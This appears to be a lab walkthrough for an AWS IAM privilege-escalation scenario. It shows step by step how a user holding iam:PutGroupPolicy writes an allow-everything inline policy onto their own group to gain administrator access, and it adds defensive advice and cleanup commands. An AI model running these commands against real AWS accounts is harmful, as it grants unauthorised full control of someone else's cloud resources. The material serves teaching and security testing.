# Guided Walkthrough: Self-Escalation via iam:PutGroupPolicy

This scenario demonstrates a self-escalation vulnerability where a user has permission to put inline policies on a group they belong to. The user `pl-prod-iam-011-to-admin-paul` is a member of `pl-prod-iam-011-to-admin-escalation-group` and has `iam:PutGroupPolicy` permission scoped to that same group. By adding an administrator inline policy to their own group, the user can escalate themselves to full administrator access without touching any other principal.

This class of misconfiguration is easy to introduce accidentally. An operator grants a team member the ability to "manage group policies" for their own group, intending to let them maintain access controls for their team. What they've actually done is grant the user the ability to grant themselves any permission, including `AdministratorAccess`. IAM does not prevent a user from calling `PutGroupPolicy` on a group they are a member of — that policy decision is left entirely to the granting principal.

In real environments this pattern appears when teams self-manage their IAM groups, when automation accounts need to update group policies dynamically, or when a broad `iam:*` grant is scoped down to a specific group ARN that the user happens to belong to.

## The Challenge

You start with credentials for `arn:aws:iam::{account_id}:user/pl-prod-iam-011-to-admin-paul`. This user has a single meaningful permission: `iam:PutGroupPolicy` on `*`. The user is also a member of `pl-prod-iam-011-to-admin-escalation-group`, which currently has no policies attached.

Your goal is to reach administrator access in the account.

## Reconnaissance

First, confirm your identity and verify the group membership that makes this attack possible.

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-iam-011-to-admin-paul
```

Check that `pl-prod-iam-011-to-admin-paul` is indeed a member of the escalation group:

```bash
aws iam get-group \
  --group-name pl-prod-iam-011-to-admin-escalation-group \
  --query 'Users[*].UserName' \
  --output text
# pl-prod-iam-011-to-admin-paul
```

Confirm the current permissions are limited by attempting a privileged call:

```bash
aws iam list-users --max-items 1
# An error occurred (AccessDenied) -- no admin access yet
```

The pieces are in place: you control `iam:PutGroupPolicy`, you are a member of the target group, and you do not yet have admin access.

## Exploitation

The attack is a single API call. Add an inline policy granting `AdministratorAccess` to the group you belong to:

```bash
aws iam put-group-policy \
  --group-name pl-prod-iam-011-to-admin-escalation-group \
  --policy-name EscalatedAdminAccess \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Action": "*",
        "Resource": "*"
      }
    ]
  }'
```

Because `pl-prod-iam-011-to-admin-paul` is a member of the group, the new inline policy is immediately effective for that user. IAM group policies apply to all members as soon as they are written — there is no additional step required.

## Verification

Wait a few seconds for IAM policy propagation, then verify that administrator access is now available:

```bash
# Allow up to 15 seconds for IAM propagation
sleep 15

aws iam list-users --max-items 3 --output table
# Returns a table of IAM users -- administrator access confirmed
```

If the call succeeds, `pl-prod-iam-011-to-admin-paul` now has full `AdministratorAccess` to the account through the group's inline policy.

## What Happened

The entire attack chain was a single `iam:PutGroupPolicy` call. There was no need to create new principals, assume roles, or touch any resource outside the group. The user leveraged their write access to a group they belong to in order to grant themselves administrator access — a textbook self-escalation.

This highlights a fundamental property of IAM group policies: any principal that can modify a group's policies and is a member of that group can grant themselves whatever permissions they write into the policy. Defending against this requires either preventing `iam:PutGroupPolicy` on groups where the caller is a member, or ensuring that no non-admin principal ever holds this permission at all.

To clean up the attack artifact, run `plabs cleanup iam-011-iam-putgrouppolicy` or remove the inline policy manually:

```bash
aws iam delete-group-policy \
  --group-name pl-prod-iam-011-to-admin-escalation-group \
  --policy-name EscalatedAdminAccess
```
